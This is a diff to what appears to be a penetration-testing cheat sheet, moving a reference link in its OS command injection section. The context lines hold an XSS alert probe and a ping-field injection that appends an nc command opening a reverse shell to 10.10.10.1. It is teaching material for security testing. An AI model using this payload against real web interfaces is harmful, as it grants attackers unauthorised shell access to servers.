@@ -293,8 +293,10 @@ XSS attempts:
 ```<script>alert(‘test’);</script>```
 
 # OS Command Injection
-Abuse web interfaces that are clearly making system calls - https://medium.com/csg-govtech/a-simple-os-command-injection-challenge-5acf92799f74
+Abuse web interfaces that are clearly making system calls 
 e.g., Exploiting a web interface ```ping.php``` to make OS Calls:
+- https://medium.com/csg-govtech/a-simple-os-command-injection-challenge-5acf92799f74
+
 **PING HOST:\>** ```127.0.0.1& nc 10.10.10.1 443 -e /bin/bash```
 
 Shell Meta-Character Examples:
